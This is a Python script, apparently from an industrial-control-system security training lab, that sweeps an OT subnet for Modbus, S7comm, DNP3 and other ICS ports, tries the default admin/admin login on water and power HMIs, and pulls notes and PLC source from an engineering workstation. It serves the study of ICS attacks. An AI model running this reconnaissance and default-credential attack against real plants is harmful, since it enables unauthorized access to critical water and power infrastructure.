#!/usr/bin/env python3
"""Scenarios 1-3, discovery.

  recon.py sweep        TCP-connect scan of the OT /24 for ICS ports
  recon.py creds        try the factory-default HMI logins
  recon.py engws        pull what the engineering workstation is sharing
"""
import http.cookiejar
import socket
import sys
import urllib.request

import targets as T

ICS_PORTS = {502: "Modbus/TCP", 44818: "EtherNet/IP", 102: "S7comm",
             8080: "HTTP (HMI / runtime)", 22: "ssh", 20000: "DNP3"}


def sweep():
    print(f"[*] TCP-connect sweep of {T.OT_SUBNET}0/24")
    for host in (T.OT_SUBNET + str(i) for i in range(1, 40)):
        open_ports = []
        for port in ICS_PORTS:
            s = socket.socket()
            s.settimeout(0.3)
            if s.connect_ex((host, port)) == 0:
                open_ports.append(port)
            s.close()
        if open_ports:
            desc = ", ".join(f"{p}/{ICS_PORTS[p]}" for p in open_ports)
            print(f"    {host:<16} {desc}")
    print("[*] the internet should never be able to run this scan against a "
          "real plant")


def creds():
    for name, host in (("water HMI", T.HMI_WATER), ("power HMI", T.HMI_POWER)):
        url = f"http://{host}:{T.HTTP_PORT}/login"
        data = b"username=admin&password=admin"
        try:
            # carry the session cookie through the post-login redirect
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
            req = urllib.request.Request(url, data=data)
            with opener.open(req, timeout=3) as r:
                body = r.read(4000).decode("utf-8", "replace")
            # a rejected login re-renders the form; an accepted one lands on
            # the operator screen and has no password field
            hit = 'type="password"' not in body
            print(f"[{'+' if hit else '-'}] {name} admin/admin -> "
                  f"{'ACCEPTED' if hit else 'rejected'}")
        except Exception as exc:
            print(f"[-] {name}: {exc}")


def engws():
    for path in ("/", "/notes.txt", "/water_plc.st"):
        url = f"http://{T.ENG_WS}:{T.HTTP_PORT}{path}"
        try:
            with urllib.request.urlopen(url, timeout=3) as r:
                body = r.read(4000).decode("utf-8", "replace")
            print(f"--- {url} ---\n{body}\n")
        except Exception as exc:
            print(f"[-] {url}: {exc}")


if __name__ == "__main__":
    {"sweep": sweep, "creds": creds, "engws": engws}.get(
        sys.argv[1] if len(sys.argv) > 1 else "sweep",
        lambda: print(__doc__),
    )()
